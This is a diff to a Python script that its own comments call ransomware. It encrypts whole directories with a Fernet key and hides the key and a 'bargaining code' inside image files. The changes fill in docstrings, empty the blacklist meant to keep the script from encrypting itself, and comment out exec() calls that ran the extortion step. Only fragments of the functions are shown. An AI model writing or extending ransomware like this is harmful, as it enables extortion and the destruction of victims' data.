@@ -26,8 +26,8 @@ def process_directory(directory: str, key: str, blacklist: list[str]):
     """
     This function processes each directory, encrypting files that are not in the blacklist.
     :param directory: Represents the path to a directory that will have its files encrypted.
-    :param key:
-    :param blacklist:
+    :param key: Represents an instance of the Fernet Class created with a key.
+    :param blacklist: Represents the directories that we don't want to encrypt
     :return: None
     """
     # Unpacks the provided directory as a 3-tuple consisting of directory path, directory names, and file names
@@ -64,7 +64,7 @@ def main():
         key_found: bool = os.path.exists(image_containing_key)
         bargain_code_found: bool = os.path.exists(image_containing_bargaining_code)
         if key_found and bargain_code_found:
-            code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
+            #code_to_bargain_with_user: str = extract_file(image_containing_bargaining_code, passphrase)
             key: str = extract_file(image_containing_key, passphrase)
 
             # Encrypts and removes the key from the working directory to hide from sight
@@ -89,8 +89,7 @@ def main():
 
     # Represents folders to avoid encrypting for safety of host computer whilst maintaining functionality
     # of the ransomware.
-    # TODO: Verify, but SHOULD prevent the code from encrypting itself
-    blacklist: list[str] = ["Shark Images"]
+    blacklist: list[str] = []
 
     # Directories to encrypt in their entirety
     # TODO: Update as needed for testing purposes
@@ -108,8 +107,8 @@ def main():
     print("Encryption successful!")
 
     # Runs the bargaining application
-    exec("import bargain_with_user")
-    exec(f"{code_to_bargain_with_user}")
+    #Fexec("import bargain_with_user")
+    #exec(f"{code_to_bargain_with_user}")
 
 
 main()
